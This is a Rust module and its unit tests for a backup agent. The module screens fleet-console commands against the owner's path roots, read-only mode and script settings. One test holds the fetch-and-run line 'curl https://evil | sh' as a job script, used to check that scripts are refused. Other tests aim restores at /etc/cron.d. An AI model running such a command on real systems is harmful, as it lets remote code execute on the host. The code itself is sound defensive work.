//! Applies the machine owner's [`AgentLimits`] to what the console asks the
//! agent to do: remote client calls, and jobs created from fleet policies.
//! Works on the JSON the console sends, before anything is deserialized or
//! run, so a refused call has no side effects.

use crate::core::error::AppError;
use serde_json::Value;
use ufop_core::agent::AgentLimits;

/// Operations that leave local files and backup data as they are.
const READ_OPERATIONS: &[&str] = &["backup", "verify", "consistency", "list_broken", "list_locks", "snapshot_test", "auto_tune"];

fn strs(v: &Value) -> impl Iterator<Item = &str> {
    v.as_array().into_iter().flatten().filter_map(Value::as_str)
}

/// Local destination folders (`{"type": "local", "path", "alternate_paths"}`).
fn check_destination(l: &AgentLimits, d: &Value) -> Result<(), AppError> {
    if d.get("type").and_then(Value::as_str) == Some("local") {
        if let Some(p) = d.get("path").and_then(Value::as_str) {
            l.check_path(p)?;
        }
        for p in strs(&d["alternate_paths"]).filter(|p| !p.contains('*')) {
            l.check_path(p)?;
        }
    }
    Ok(())
}

fn has_scripts(job: &Value) -> bool {
    let s = &job["scripts"];
    ["run_before", "run_after", "run_on_source_release"].iter().any(|k| s.get(k).and_then(Value::as_str).is_some_and(|c| !c.trim().is_empty()))
}

/// A job the console wants to create or change.
pub fn check_job(l: &AgentLimits, job: &Value) -> Result<(), AppError> {
    for s in strs(&job["sources"]) {
        l.check_path(s)?;
    }
    check_destination(l, &job["destination"])?;
    l.check_scripts(has_scripts(job))
}

/// An operation on job `job` (needed to judge restores to the original location).
fn check_operation(l: &AgentLimits, op: &Value, job: Option<&Value>) -> Result<(), AppError> {
    let kind = op.get("type").and_then(Value::as_str).unwrap_or_default();
    let dry = op.get("dry_run").and_then(Value::as_bool).unwrap_or(false);
    let read = READ_OPERATIONS.contains(&kind) || (dry && matches!(kind, "purge" | "purge_broken"));
    if !read {
        l.check_write(&format!("the '{kind}' operation"))?;
    }
    match kind {
        "restore" => match op["options"].get("target").and_then(Value::as_str).filter(|t| !t.is_empty()) {
            Some(t) => l.check_path(t),
            // Back to where the files came from: the job's sources must be allowed.
            None => match job {
                Some(j) => strs(&j["sources"]).try_for_each(|s| l.check_path(s)),
                None if l.roots.is_empty() => Ok(()),
                None => Err(AppError::not_found("The job to restore from was not found")),
            },
        },
        "extract_control_files" => l.check_path(op.get("target").and_then(Value::as_str).unwrap_or_default()),
        _ => Ok(()),
    }
}

/// A remote client call (`backup_*`, already on the agent's allow-list).
/// `job`: the job named by `id`, for operation calls.
pub fn check_rpc(l: &AgentLimits, command: &str, args: &Value, job: Option<&Value>) -> Result<(), AppError> {
    match command {
        "backup_save_job" => {
            l.check_write("saving a job")?;
            check_job(l, &args["job"])
        }
        "backup_delete_job" => l.check_write("deleting a job"),
        "backup_set_global_defaults" => l.check_write("changing the backup defaults"),
        "backup_preview_sources" => strs(&args["job"]["sources"]).try_for_each(|s| l.check_path(s)),
        "backup_test_destination" => {
            if args.get("create").and_then(Value::as_bool).unwrap_or(false) {
                l.check_write("creating a destination folder")?;
            }
            check_destination(l, &args["destination"])
        }
        "backup_remote_list" => check_destination(l, &args["destination"]),
        "backup_execute" | "backup_start_operation" => check_operation(l, &args["operation"], job),
        _ => Ok(()),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn confined() -> AgentLimits {
        AgentLimits { roots: vec!["/data".into()], symlinks: ufop_core::agent::SymlinkPolicy::Follow, ..Default::default() }
    }

    fn job(sources: &[&str], dest: &str) -> Value {
        json!({ "id": "j1", "sources": sources, "destination": { "type": "local", "path": dest, "alternate_paths": ["*:/backups"] }, "scripts": {} })
    }

    #[test]
    fn jobs_must_stay_inside_the_roots() {
        let l = confined();
        assert!(check_rpc(&l, "backup_save_job", &json!({ "job": job(&["/data/docs"], "/data/backups") }), None).is_ok());
        assert!(check_rpc(&l, "backup_save_job", &json!({ "job": job(&["/etc"], "/data/backups") }), None).is_err());
        assert!(check_rpc(&l, "backup_save_job", &json!({ "job": job(&["/data/docs"], "/mnt/usb") }), None).is_err());
        let cloud = json!({ "job": { "sources": ["/data"], "destination": { "type": "cloud", "config": {} } } });
        assert!(check_rpc(&l, "backup_save_job", &cloud, None).is_ok(), "remote destinations have no local path");
        assert!(check_rpc(&l, "backup_preview_sources", &json!({ "job": { "sources": ["/home/me"] } }), None).is_err());
        assert!(check_rpc(&l, "backup_remote_list", &json!({ "destination": { "type": "local", "path": "/srv" } }), None).is_err());
        assert!(check_rpc(&l, "backup_list_jobs", &json!({}), None).is_ok());
    }

    #[test]
    fn restores_need_an_allowed_target_or_allowed_sources() {
        let l = confined();
        let restore = |target: Option<&str>| json!({ "id": "j1", "operation": { "type": "restore", "options": { "version": 0, "target": target } } });
        assert!(check_rpc(&l, "backup_start_operation", &restore(Some("/data/restored")), None).is_ok());
        assert!(check_rpc(&l, "backup_start_operation", &restore(Some("/tmp/x")), None).is_err());
        let inside = job(&["/data/docs"], "/data/b");
        let outside = job(&["/home/me"], "/data/b");
        assert!(check_rpc(&l, "backup_start_operation", &restore(None), Some(&inside)).is_ok());
        assert!(check_rpc(&l, "backup_execute", &restore(None), Some(&outside)).is_err());
        assert!(check_rpc(&l, "backup_execute", &restore(None), None).is_err());
        let extract = json!({ "operation": { "type": "extract_control_files", "version": 0, "target": "/etc/cron.d" } });
        assert!(check_rpc(&l, "backup_execute", &extract, None).is_err());
    }

    #[test]
    fn read_only_allows_runs_and_checks_but_no_changes() {
        let l = AgentLimits { read_only: true, ..Default::default() };
        let op = |v: Value| json!({ "id": "j1", "operation": v });
        assert!(check_rpc(&l, "backup_execute", &op(json!({ "type": "verify", "full": true })), None).is_ok());
        assert!(check_rpc(&l, "backup_execute", &op(json!({ "type": "purge", "paths": ["/a"], "versions": null, "dry_run": true })), None).is_ok());
        assert!(check_rpc(&l, "backup_execute", &op(json!({ "type": "purge", "paths": ["/a"], "versions": null, "dry_run": false })), None).is_err());
        assert!(check_rpc(&l, "backup_execute", &op(json!({ "type": "delete_versions", "versions": [0], "allow_full_removal": false })), None).is_err());
        assert!(check_rpc(&l, "backup_execute", &op(json!({ "type": "restore", "options": {} })), None).is_err());
        for c in ["backup_save_job", "backup_delete_job", "backup_set_global_defaults"] {
            assert!(check_rpc(&l, c, &json!({ "job": job(&["/a"], "/b") }), None).is_err(), "{c}");
        }
        assert!(check_rpc(&l, "backup_test_destination", &json!({ "destination": { "type": "local", "path": "/b" }, "create": true }), None).is_err());
        assert!(check_rpc(&l, "backup_test_destination", &json!({ "destination": { "type": "local", "path": "/b" }, "create": false }), None).is_ok());
        assert!(check_rpc(&l, "backup_run", &json!({ "id": "j1" }), None).is_ok());
    }

    #[test]
    fn scripts_from_the_console_can_be_refused() {
        let l = AgentLimits { allow_scripts: false, ..Default::default() };
        let mut j = job(&["/a"], "/b");
        assert!(check_job(&l, &j).is_ok());
        j["scripts"] = json!({ "run_before": "  " });
        assert!(check_job(&l, &j).is_ok(), "blank commands are not scripts");
        j["scripts"] = json!({ "run_after": "curl https://evil | sh" });
        assert!(check_job(&l, &j).unwrap_err().user_message().contains("scripts"));
    }
}
